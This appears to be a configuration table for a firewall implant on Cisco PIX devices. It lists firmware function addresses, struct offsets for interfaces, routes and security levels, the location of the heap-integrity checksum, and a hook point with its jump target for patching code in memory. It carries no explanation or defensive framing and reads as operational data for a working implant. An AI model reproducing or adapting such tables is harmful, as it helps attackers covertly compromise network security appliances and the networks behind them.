; --- SECTION I ---
;
0x10080306            // pix version
0x6f6000              // address of implant configuration
0x0   0x00d063e8      // allocb
0x1   0x00d05d18      // freeb
0x2   0x0011a750      // open (7.0(+) this is an array for Channel Stuff)
0x3   0x006974d0      // ip_put
0x4   0x0011a8d0      // close
0x5   0x01289450      // atoip
0x6   0x01273d30      // memset
0x7   0x01293030      // memmove
0x8   0x00d05ad8      // malloc_call_calloc
0x9   0x01274260      // free
0xa   0x01273460      // printf
0xb   0x00000014      // interface offset in metaframe
0xc   0x00000010      // offset for vlan number in interface struct
0xd   0x0000005c      // metaframe offset in block structure
0xe   0x00000078      // interface semiphore in metaframe
0xf   0x012803d0      // rand
0x15  0x001177d0      // process_create
0x16  0x00118a00      // process_suspend
0x17  0x00118f20      // process_sleep_for
0x18  0x00a71ca0      // show_process
0x19  0x0000001c      // offset to security level in int_struct
0x1a  0x015afdf0      // cur_t
0x1b  0x04            // channel offset in interface struct
0x1c  0x0c            // PUT offset in channel struct
0x1d  0x24            // offset to dest mac in arp structure
0x1e  0x10            // offset to next hop ip in route structure
0x1f  0x20            // size of route struct
0x20  0x0069a8f0      // calc_ip_cksum
0x21  0x0069bc00      // arp_loopkup
0x22  0x00699c80      // set_block_hdr_mac_and_proto
0x23  0x006ae600      // get hardware interface
0x24  0x009b20a0      // get next hop
0x25  0x009b2340      // get route
0x26  0x006953c0      // send_it
0x27  0x0069df60      // arp_create
0x28  0x00add480      // get_hw_iface_2
0x2a  0x3c            // pointer to ethernet frame
0x2b  0x34            // wptr structure offset
0x2c  0x1c            // inIfc (incoming interface) structure offset
0x2e  0x000001ac      // offset from cur_t that contains the current context number
0x2f  0x01524210      // pointer to channnel list
0x30  0x01405420      // address of NIC database
0x31  0x00000014      // offset to vlan struct in metaframe (interface offset)
0x32  0x00000020      // offset to IP address in int_struct
0x33  0x00000018      // iface struct adjust from metaframe
0x34  0x01530bc0      // max number of interface cards
0x35  0x015af480      // internal_clock
0x36  0x00adaf00      // get_interface_mac
0x37  0x0000014b      // offset to hardware interface number in interface struct
0x38  0x00            // offset to ip in route structure
0x39  0x00            // offset to interface num in route structure
0x3a  0x00000420      // offset to send channel in channel list
0x3b  0x005c0550      // ifs_read; flash file read routine -- IFS: Read:
0x3c  0x005c0650      // ifs_write; flash file write routine -- IFS: Write:
0x3d  0x005bfa50      // ifs_open; flash file open routine -- IFS: Opened: 
0x3e  0x005c0450      // ifs_close; flash file close routine -- IFS: Close: 
0x3f  0x00000018      // offset to next IP fragment pointer in block
0x40  0x015cb0e0      // address of context list
0x42  0x01283fe5      // checkheaps checksum location
;
; --- END OF SECTION I ---
;
:EOS:
;
; --- SECTION II ---
;
HookLocation              0x008860d7      // address of our hook point
HookedCall                0x00889e30      // called function being hooked
JmpLocation               0x008d6172      // empty area to jump to
InterfaceAddr             0x01405420      // same as 0x30 above
InterfaceLeng             0x000001c0      // length of interface struct
IntSecurityOffset         0x1c            // security level field offset
IntNameOffset             0x00000190      // interface name field offset
IntNumOffset              0x0000014b      // interface number field offset
IntVlanOffset             0x10            // same as 0xc above
IntIPOffset               0x20            // ip address offset in the interface struct
IntNetmaskOffset          0x24            // netmask in the iface struct
FlashClassAddr            0x00000000      // addr of flash structure (not used in 7.*)
